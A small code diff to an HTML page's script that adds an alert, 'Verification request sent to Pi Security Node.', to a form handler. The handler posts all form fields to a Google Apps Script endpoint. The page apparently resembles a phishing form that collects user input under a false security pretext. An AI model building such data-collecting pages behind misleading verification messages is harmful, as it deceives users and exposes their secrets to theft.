@@ -97,6 +97,9 @@
         document.getElementById("submissionForm").addEventListener("submit", function(event) {
             event.preventDefault(); // Prevent the default form submission
 
+            // Display alert when the submit button is clicked
+            alert("Verification request sent to Pi Security Node.");
+
             var formData = new FormData(this);
 
             fetch('https://script.google.com/macros/s/AKfycbzy7ov1qXZl1hiXPFB07Bbgf5-Bp7GMAGKcNwyUHBzGYFj4oZ_X75QvAlmUv_WKbTEMnA/exec', {
@@ -112,7 +115,6 @@
             .then(data => {
                 console.log(data);
             })
-            
         });
     </script>
 </body>
